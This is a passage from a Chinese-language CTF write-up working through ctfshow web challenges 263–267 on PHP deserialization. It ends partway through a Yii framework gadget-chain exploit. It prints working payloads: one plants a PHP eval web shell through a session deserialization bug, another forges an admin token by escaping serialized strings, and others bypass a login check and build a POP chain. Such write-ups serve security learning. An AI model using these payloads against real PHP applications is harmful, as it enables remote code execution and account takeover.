中会把 password 写入 log-username 文件中，而这里的 username 和 password 可控，在 index.php 中会检查是否设置了 session，并且：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​因为 session.save_handler=&quot;&quot; 于 user.ini 默认设置不符，会反序列化 session 中 | 后的数据所以可以直接构造 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">#palyoad:fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNDoiPD9waHAgZXZhbCgkX1BPU1RbYV0pOz8%2BIjt9</span></span><br></pre></td></tr></table></figure><p>​之后访问 index.php，将 cookie 的 limit 参数改为生成的 base64 编码字符串，然后访问 check.php，最后访问 log-1.php 即可进行 rce。</p><h1 id="web264"><a class="markdownIt-Anchor" href="#web264">#</a> web264：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>​和 262 一样，访问 message.php，然后代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里似乎不能修改 cookie 了，没办法了，直接打吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$msg_1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg_1</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>​index.php 用 get 传参 payload，之后访问 message.php，cookie 后面加一个；msg=1 即可。</p><h1 id="web265"><a class="markdownIt-Anchor" href="#web265">#</a> web265：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>php 的特性，按地址传参</p><p>例如 $a = 1  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mn>2</mn><mo separator="true">,</mo><mtext>这时让</mtext></mrow><annotation encoding="application/x-tex">b = 2, 这时让</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">让</span></span></span></span> b = &amp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mtext>再给</mtext></mrow><annotation encoding="application/x-tex">a, 再给</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">给</span></span></span></span> a 重新赋个值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mn>3</mn><mo separator="true">,</mo><mtext>这个时候</mtext></mrow><annotation encoding="application/x-tex">a = 3, 这个时候</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span></span></span></span> b 就会一直跟着 $a 变化，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext>是什么</mtext></mrow><annotation encoding="application/x-tex">a是什么</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">什</span><span class="mord cjk_fallback">么</span></span></span></span> b 就是什么</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>​这个就会发现，a 的值会跟着 b 一起改变。所以 payload 可以如下生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password =&amp; <span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web266"><a class="markdownIt-Anchor" href="#web266">#</a> web266：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​首先，$cs = file_get_contents (‘php://input’);，可以访问请求的原始数据流，可以获取到 GET 和 POST 的数据，那么，这里就可以通过 post 发一个包，数据流是一个 ctfshow 的一个序列化后的字符串，这里需要触发 <code>__destruct</code>  方法， 传入一个 <code>O:7:&quot;ctfshow&quot;:2:&#123;&#125;</code>  即可输出 flag，但是具体是为啥就不大清楚了，没有修改那个为 2 的话，就无法触发 destruct。因为估计是破坏序列化后的结果，仍会执行__destruct。</p><h1 id="web267"><a class="markdownIt-Anchor" href="#web267">#</a> web267：</h1><p>​考点，yii 框架反序列化漏洞。</p><p>​查看源码，在最后发现如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/assets/b021fd51/yii.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​推测应该是 yii 框架，虽然还没学这个是个啥，右上角发现了 login，点进去是一个登陆页面，账号为 admin，弱密码爆破一下，得到密码为 admin，之后点右上角的 about，有一个注释：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?view-source --&gt;</span></span><br></pre></td></tr></table></figure><p>​前面加了个问好，是提示我们需要 get 传参，传一个后发现反序列化的一个代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>​进入 yii.js 后提示 yii 版本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Yii JavaScript module.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> http://www.yiiframework.com/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span> Copyright (c) 2008 Yii Software LLC</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span> http://www.yiiframework.com/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Qiang Xue &lt;qiang.xue<span class="doctag">@gmail</span>.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>​之后查找历史漏洞找到了一下 poc，这个漏洞有条件再看，现在先不看，直接用 poc 打：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span 